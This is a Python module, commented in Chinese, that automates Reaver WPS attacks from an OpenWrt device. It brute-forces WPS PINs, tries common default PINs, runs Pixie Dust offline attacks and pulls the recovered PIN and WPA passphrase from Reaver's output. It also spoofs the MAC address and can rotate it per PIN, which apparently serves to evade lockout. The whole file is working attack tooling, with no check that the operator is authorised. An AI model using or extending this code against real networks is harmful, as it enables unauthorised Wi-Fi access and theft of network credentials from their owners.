"""OpenWrt Reaver/WPS 任务接口。"""

import random
import re
import time
import sys
from .models import CaptureCleanupError
from .wps_observation import analyze, pixie_result_note
from .wps_session import prepare_session, checkpoint
from .wps_options import prepare_wps_options, spoof_mac_for
from .wps_models import WpsTargetResult, WpsUpdate
from .wps_results import write_wps_result
from .wps_protocol_evidence import WpsProtocolEvidence
from .wps_diagnostics import WpsDiagnosticTrace
from .wps_timing import WpsCandidateTiming
from pathlib import Path, PurePosixPath

from modules.capture_services.openwrt.command_builder import (
    normalize_bssid,
    normalize_channel,
    quote_argument,
)


_PIN_RE = re.compile(r"WPS PIN:\s*(.+)", re.IGNORECASE)
_PSK_RE = re.compile(r"WPA PSK:\s*(.+)", re.IGNORECASE)

# 附加参数白名单：无值开关与带数值开关。-i/-b/-c/-s/-p/-m/-K/信道类由程序控制，
# 一律拒绝，避免用户输入改写关键目标参数；长选项全部拒绝。
_EXTRA_FLAG_OK = frozenset({"-S", "-N", "-E", "-L", "-P", "-q", "-v"})
_EXTRA_VALUE_OK = {
    "-l": (1, 1000),
    "-d": (0, 100),
    "-t": (0, 100),
    "-T": (1, 3600),
    "-r": (1, 100),
    "-x": (1, 86400),
    "-g": (1, 100),
}

# 秒 Pin 兜底常用默认 PIN（用户 partial 优先）；尽力而为，不保证命中。
_COMMON_PINS = ("12345670", "00000000", "11111111", "22222222", "88888888")


class OpenWrtWpsCapture:
    """普通 Pin、快速 Pin、Pixie Dust 和会话恢复的统一后端边界。"""

    def __init__(self, command_runner, process_manager):
        self.command_runner = command_runner
        self.process_manager = process_manager

    @staticmethod
    def sanitize_extra_args(text):
        """把用户附加参数限制在白名单内，返回可拼接的命令片段。

        参数 text 是设置页原文。非法 token 直接抛错（不静默丢弃，避免用户以为
        生效）。数值开关钳制到允许范围。
        """

        parts = []
        tokens = str(text or "").strip().split()
        index = 0
        while index < len(tokens):
            token = tokens[index]
            if token in _EXTRA_FLAG_OK:
                parts.append(token)
                index += 1
            elif token in _EXTRA_VALUE_OK:
                if index + 1 >= len(tokens):
                    raise RuntimeError(f"附加参数 {token} 缺少数值。")
                try:
                    number = float(tokens[index + 1])
                except (TypeError, ValueError):
                    raise RuntimeError(f"附加参数 {token} 的数值不正确：{tokens[index + 1]}。")
                low, high = _EXTRA_VALUE_OK[token]
                number = max(low, min(number, high))
                value = str(int(number)) if number.is_integer() else str(number)
                parts.extend([token, value])
                index += 2
            else:
                raise RuntimeError(
                    f"附加参数不允许：{token}（-i/-b/-c/-s/-p/-m/-K 由程序控制，长选项不支持）。"
                )
        return " ".join(parts)

    def run_targets(
        self,
        workspace,
        monitor_interface,
        session_id,
        targets,
        mode,
        options,
        local_output_dir,
        workspace_manager,
        cancel_event=None,
        progress_callback=None,
        *, diagnostic_index=0, diagnostic_total=None, diagnostic_trace=None, source_rotation=None,
    ):
        """对多个已扫描目标逐个跑 Pin，返回每目标结局元组。

        参数：mode 是 normal/second/offline/combo；options 是 WPS 设置字典；
        其余与 H 任务同义。副作用：在远端工作目录运行 reaver，结束下载 .wpc。
        """

        options = prepare_wps_options(options, mode=mode)
        local_output_dir = Path(local_output_dir)
        results = []
        for index, target in enumerate(targets):
            self._check_cancel(cancel_event)
            trace = diagnostic_trace or WpsDiagnosticTrace(session_id, diagnostic_index + index,
                diagnostic_total or len(targets), target, mode, options)
            result = error = None
            try:
                result = self._run_single(
                    workspace, monitor_interface, session_id, target, mode, options,
                    local_output_dir, workspace_manager, index, len(targets),
                    cancel_event, progress_callback, diagnostic=trace, source_rotation=source_rotation)
                results.append(result)
            except Exception as exc:
                error = exc
                raise
            finally:
                trace.finish(result, error, bool(cancel_event is not None and cancel_event.is_set()))
        return tuple(results)

    @staticmethod
    def skipped_result(target, mode, options=None):
        try:
            bssid = normalize_bssid(target.bssid)
            channel = normalize_channel(target.channel)
        except ValueError as exc:
            return WpsTargetResult(
                bssid=str(target.bssid or ""), ssid=str(target.ssid or ""),
                mode=mode, note=f"目标参数不正确，跳过：{exc}",
            )
        ssid = str(target.ssid or "").strip() or bssid
        label = ssid
        if not bool(getattr(target, "wps_supported", False)):
            return WpsTargetResult(
                bssid=bssid, ssid=ssid, mode=mode,
                note="未检测到目标的 WPS 广播信息，请重新扫描后再试。",
            )
        if bool(getattr(target, "wps_locked", False)):
            return WpsTargetResult(
                bssid=bssid, ssid=ssid, mode=mode,
                note="目标 WPS 已锁定，硬跑只会浪费时间，跳过。",
            )
        if mode == "second":
            from .wps_quick import quick_skip
            return quick_skip(target, options or {})
        return None

    def _run_single(
        self,
        workspace,
        monitor_interface,
        session_id,
        target,
        mode,
        options,
        local_output_dir,
        workspace_manager,
        index,
        total_targets,
        cancel_event,
        progress_callback,
        *, diagnostic=None, source_rotation=None,
    ):
        """跑单个目标：按模式组装多阶段 reaver 调用并解析输出。"""

        skipped = self.skipped_result(target, mode, options)
        if skipped is not None:
            if diagnostic is not None:
                diagnostic.skipped(target)
            return skipped
        if options.get("rotate_mac_each_pin") and source_rotation is None:
            raise RuntimeError("\u672a\u63d0\u4f9b\u5df2\u6838\u5b9e\u5f52\u5c5e\u7684 MAC \u5207\u6362\u63a7\u5236\uff0c\u672a\u542f\u52a8\u9010\u7801\u968f\u673a\u3002")
        if mode == "second":
            from .wps_quick import QuickWpsCapture
            return QuickWpsCapture(self.process_manager, self._base_args).run(
                workspace, monitor_interface, session_id, target, options,
                local_output_dir, workspace_manager, index, total_targets,
                cancel_event, progress_callback, diagnostic=diagnostic, source_rotation=source_rotation)
        bssid = normalize_bssid(target.bssid)
        ssid = str(target.ssid or "").strip() or bssid
        label = ssid
        configured_seconds = max(0, min(int(options.get("attack_seconds", 0) or 0), 3600))
        unlimited = configured_seconds == 0
        attack_seconds = float("inf") if unlimited else max(10, configured_seconds)
        attack_rounds = 1 if unlimited else max(1, min(int(options.get("attack_rounds", 1) or 1), 20))
        # Native session validation and automatic restore happen before launch.
        resume_note = ""
        options = dict(options, _session_output=str(local_output_dir))
        total_budget = attack_seconds * attack_rounds
        started = time.monotonic()
        deadline = started + total_budget
        tried = [0]
        observed = ["", "", ""]
        protocol_evidence = WpsProtocolEvidence()
        ending = ["已完成设定轮数"]
        saved_wpc = [""]
        timing = WpsCandidateTiming()
        no_reply = [False]

        def elapsed_seconds():
            elapsed = max(0, int(time.monotonic() - started))
            return elapsed if unlimited else min(total_budget, elapsed)

        def report(phase):
            if progress_callback is not None:
                elapsed = elapsed_seconds()
                candidate_elapsed, average_per_minute = timing.snapshot()
                progress_callback(
                    WpsUpdate(
                        elapsed=elapsed, total=0 if unlimited else total_budget, target_label=label,
                        target_index=index, target_total=total_targets, phase=phase,
                        current_pin=observed[0], status=observed[1], target_bssid=bssid,
                        candidate_elapsed=candidate_elapsed, average_per_minute=average_per_minute,
                    )
                )

        phase_count = [0]
        phase_state = {}

        def run_phase(args, phase, budget):
            """跑一轮 reaver，返回 (pin, psk)，超时/取消返回空。"""

            pin, psk = None, None
            end = min(deadline, time.monotonic() + budget)
            phase_state.clear()
            timing.begin_phase()
            phase_count[0] += 1
            if diagnostic is not None:
                diagnostic.phase(phase_count[0])
            handle = self.process_manager.start(
                "reaver", args, f"{session_id}-wps{index}",
                str(workspace.remote_dir), cancel_event,
                max_runtime=0 if unlimited else max(60, int(budget) + 30),
                **({"renewable_output": str(PurePosixPath(workspace.remote_dir) / "reaver.log")} if unlimited else {}),
            )
            stop_reason = "time_budget"
            observed[:] = ["", "等待工具状态", ""]
            ending[0] = "\u672a\u8bbe\u7f6e\u603b\u65f6\u9650" if unlimited else "\u5df2\u8fbe\u5230\u8bbe\u5b9a\u7684\u8fd0\u884c\u65f6\u9650"
            next_checkpoint = time.monotonic() + 20
            from .process_lease import RENEW_SECONDS
            next_renewal = time.monotonic() + RENEW_SECONDS
            def consume(tail):
                nonlocal pin, psk
                pin, psk = self._scan_output(tail, pin, psk)
                protocol_evidence.feed(tail)
                timing.feed(tail)
                if diagnostic is not None:
                    diagnostic.feed(tail)
                if "quitting after 1 crack attempts" in str(tail).lower():
                    phase_state["single_limit"] = True
                observation = analyze(tail)
                if observation.current_pin: observed[0] = observation.current_pin
                if observation.status: observed[1] = observation.status
                if observation.stage: observed[2] = observation.stage
            try:
                report(phase)
                while time.monotonic() < end:
                    self._check_cancel(cancel_event)
                    if not self.process_manager.is_running(handle, cancel_event):
                        stop_reason = "native_exit"
                        phase_state["native_exit"] = True
                        ending[0] = "Reaver 已提前退出（非本软件时限）"
                        break
                    if unlimited and time.monotonic() >= next_renewal:
                        self.process_manager.renew_watchdog(handle, cancel_event)
                        next_renewal = time.monotonic() + RENEW_SECONDS
                    tail = self.process_manager.read_log_tail(handle, 100, cancel_event)
                    consume(tail)
                    if psk:
                        stop_reason = "credential_found"
                        break
                    report(phase)
                    if timing.reply_timed_out():
                        no_reply[0] = True
                        stop_reason = "candidate_no_reply"
                        ending[0] = "当前 PIN 连续 60 秒无有效 WPS 回复，已自动结束本目标"
                        if diagnostic is not None:
                            diagnostic.event("candidate_no_reply", seconds=60)
                        break
                    if time.monotonic() >= next_checkpoint:
                        saved_wpc[0] = self._download_wpc(workspace, workspace_manager, bssid, local_output_dir, None) or saved_wpc[0]
                        next_checkpoint = time.monotonic() + 20
                    if cancel_event is not None:
                        cancel_event.wait(2)
                    else:
                        time.sleep(2)
                tail = self.process_manager.read_log_tail(handle, 100, None)
                consume(tail)
                self._check_cancel(cancel_event)
            finally:
                primary = sys.exc_info()[1]
                if primary is not None:
                    stop_reason = "cancelled" if cancel_event is not None and cancel_event.is_set() else "exception"
                phase_state["stop_reason"] = stop_reason
                cleanup = None
                try:
                    self.process_manager.stop(handle, None, graceful_signal="INT")
                except Exception as exc:
                    cleanup = exc
                if diagnostic is not None:
                    diagnostic.event("process_stopped", reason=stop_reason, cleanup_ok=cleanup is None)
                    try:
                        diagnostic.feed(self.process_manager.read_log_tail(handle, 100, None), final=True)
                    except Exception:
                        diagnostic.event("final_log_unavailable")
                saved_wpc[0] = self._download_wpc(workspace, workspace_manager, bssid, local_output_dir, None) or saved_wpc[0]
                if cleanup is not None:
                    note = f"停止 Pin 进程失败：{cleanup}"
                    raise CaptureCleanupError(f"{primary}；{note}" if primary else note, (note,)) from cleanup
                if cancel_event is not None and cancel_event.is_set():
                    note = "进度已自动保存，下次自动恢复" if saved_wpc[0] else "未获得新的可保存进度，已保留以前进度"
                    raise RuntimeError(f"WPS 任务已取消；{note}；{protocol_evidence.describe()}。") from primary
            tried[0] = elapsed_seconds()
            return pin, psk

        base = self._base_args(
            workspace, monitor_interface, target, mode, options, workspace_manager,
            cancel_event,
        )
        pin, psk = None, None
        if mode == "normal" and options.get("rotate_mac_each_pin"):
            from .wps_rotation import run_rotating_normal
            from .wps_session import session_name
            def rotating_command():
                rotated = source_rotation.next_options(options, cancel_event)
                if diagnostic is not None:
                    diagnostic.event("source_rotated", verified=True)
                return self._base_args(workspace, monitor_interface, target, mode, rotated,
                    workspace_manager, cancel_event,
                    session_path=str(PurePosixPath(workspace.remote_dir) / session_name(bssid)))
            pin, psk, rotation_note = run_rotating_normal(bssid, deadline, rotating_command,
                lambda args, remaining: run_phase(args, "常规Pin", remaining), phase_state,
                lambda: saved_wpc[0], lambda: no_reply[0], lambda: self._check_cancel(cancel_event))
            if rotation_note:
                ending[0] = rotation_note
        elif mode == "offline":
            pin, psk = run_phase(f"{base} -K 1", "Pixie Dust", total_budget)
            if pin and not psk and not no_reply[0] and time.monotonic() < deadline:
                pin2, psk2 = run_phase(
                    f"{base} -p {quote_argument(pin)}", "验证已恢复 Pin", min(attack_seconds, max(0, deadline - time.monotonic()))
                )
                pin, psk = pin2 or pin, psk2
        elif mode == "combo":
            for candidate in self._second_pins(options):
                self._check_cancel(cancel_event)
                if no_reply[0] or time.monotonic() >= deadline:
                    break
                pin, psk = run_phase(f"{base} -p {quote_argument(candidate)}", "秒Pin", attack_seconds)
                if psk or pin:
                    pin = pin or candidate
                    break
            if not psk and not no_reply[0] and time.monotonic() < deadline:
                pin, psk = run_phase(f"{base} -K 1", "离线Pin", max(0, deadline - time.monotonic()))
                if pin and not psk and not no_reply[0] and time.monotonic() < deadline:
                    pin2, psk2 = run_phase(
                        f"{base} -p {quote_argument(pin)}", "秒Pin", max(0, deadline - time.monotonic())
                    )
                    pin, psk = pin2 or pin, psk2
        else:
            for _wheel in range(attack_rounds):
                self._check_cancel(cancel_event)
                if no_reply[0] or time.monotonic() >= deadline:
                    break
                pin, psk = run_phase(base, "常规Pin", attack_seconds)
                if psk or pin:
                    break
        wpc_file = self._download_wpc(
            workspace, workspace_manager, bssid, local_output_dir, cancel_event
        ) or saved_wpc[0]
        result_file = write_wps_result(local_output_dir, ssid, bssid, pin, psk)
        note = resume_note
        if not psk:
            note = "；".join(filter(None, [note, ending[0], observed[1], protocol_evidence.describe()]))
            if not pin:
                explanation = (pixie_result_note(observed[2]) if mode in {"second", "offline"}
                               else "本次未获得 PIN 或密码，不代表已穷尽全部候选")
                note = "；".join(filter(None, [note, explanation.rstrip("。")]))
        if wpc_file:
            note = "；".join(filter(None, [note, "进度文件已自动保存（不表示 PIN 已验证成功）"]))
        elif mode not in {"second", "offline"}:
            note = "；".join(filter(None, [note, "未获得新的可保存进度，以前进度保留"]))
        timing.freeze()
        report("结束")
        return WpsTargetResult(
            bssid=bssid, ssid=ssid, mode=mode,
            pin_ok=bool(pin), psk_ok=bool(psk), tried_seconds=tried[0],
            result_file=result_file, wpc_file=wpc_file, note=note,
        )

    @staticmethod
    def _scan_output(text, pin, psk):
        """从 reaver 日志文本提取 PIN/PSK，已有值的不覆盖为空。"""

        for line in str(text or "").splitlines():
            match = _PIN_RE.search(line)
            if match:
                value = match.group(1).strip().strip(" '\"")
                if value:
                    pin = value
            match = _PSK_RE.search(line)
            if match:
                value = match.group(1).strip().strip(" '\"")
                if value:
                    psk = value
        return pin, psk

    @staticmethod
    def _second_pins(options):
        """秒 Pin 候选 PIN：用户 partial 优先，否则内置常见默认。"""

        partial = re.sub(r"\D", "", str(options.get("partial_pin", "") or ""))
        if partial:
            return (partial,)
        return _COMMON_PINS

    def _base_args(
        self, workspace, monitor_interface, target, run_mode, options,
        workspace_manager, cancel_event, *, session_path=None,
    ):
        """组装 reaver 公共参数（含会话恢复与伪装），返回完整命令。"""

        bssid = normalize_bssid(target.bssid)
        channel = normalize_channel(target.channel)
        parts = [
            f"cd {quote_argument(str(workspace.remote_dir))} &&",
            "exec reaver",
            "-n",
            f"-i {quote_argument(monitor_interface)}",
            f"-b {quote_argument(bssid)}",
            f"-c {channel}",
            "-vv",
            "-f",
            f"-d {max(0, min(int(options.get('pin_speed', 1) or 1), 100))}",
            # Mint 误把速率同时填进 -t；这里 -t 必须用超时时间。
            f"-t {max(0, min(int(options.get('pin_timeout', 5) or 5), 100))}",
        ]
        if str(getattr(target, "band", "2.4G") or "2.4G") == "5G":
            parts.append("-5")
        mac = spoof_mac_for(options)
        if mac:
            parts.extend(["-m", quote_argument(mac)])
        builder = (lambda: self._build_order_wpc(options, bssid, workspace, workspace_manager, cancel_event)) if run_mode == "normal" else None
        if session_path is None:
            session_path, _restored = prepare_session(workspace, workspace_manager, bssid, options,
                options.get("_session_output", workspace.local_dir), builder)
        parts.extend(["-s", quote_argument(session_path)])
        extra = self.sanitize_extra_args(options.get("additional_args", ""))
        if extra:
            parts.append(extra)
        return " ".join(parts)

    def _build_order_wpc(self, options, bssid, workspace, workspace_manager, cancel_event):
        """按 PIN 排序生成远端 .wpc，返回远端路径；排序非法返回空串。

        复刻 Mint 的排序表逻辑：10 位数字排列＋随机开关；非法时不阻断主流程。
        """

        number_str = re.sub(r"\D", "", str(options.get("pin_order", "") or ""))
        if not number_str:
            number_str = "0123456789"
        if len(number_str) != 10 or sorted(number_str) != sorted("0123456789"):
            return ""
        pins = [f"{int(digit) * 1000 + offset:04d}" for digit in number_str for offset in range(1000)]
        if bool(options.get("random_order", False)):
            random.shuffle(pins)
        local = Path(workspace.local_dir) / f"{bssid.replace(':', '').upper()}.wpc"
        try:
            local.parent.mkdir(parents=True, exist_ok=True)
            local.write_bytes(("0\n0\n0\n" + "\n".join(pins) + "\n" + "\n".join(f"{n:03d}" for n in range(1000)) + "\n").encode("ascii"))
            remote = PurePosixPath(workspace.remote_dir) / local.name
            workspace_manager.upload_atomic(local, remote)
        except (OSError, ValueError):
            return ""
        return str(remote)

    @staticmethod
    def _wpc_readable(path):
        """wpc 准入校验：存在、非空、不超过 1MB；不猜内部格式。"""

        try:
            size = Path(path).stat().st_size
        except OSError:
            return False
        return 0 < size <= 1024 * 1024

    def _download_wpc(self, workspace, workspace_manager, bssid, local_output_dir, cancel_event):
        """下载 reaver 会话 .wpc，缺失或损坏返回空串，不阻断主流程。"""

        return checkpoint(workspace, workspace_manager, bssid, local_output_dir)

    @staticmethod
    def _check_cancel(cancel_event):
        if cancel_event is not None and cancel_event.is_set():
            raise RuntimeError("WPS 任务已取消。")
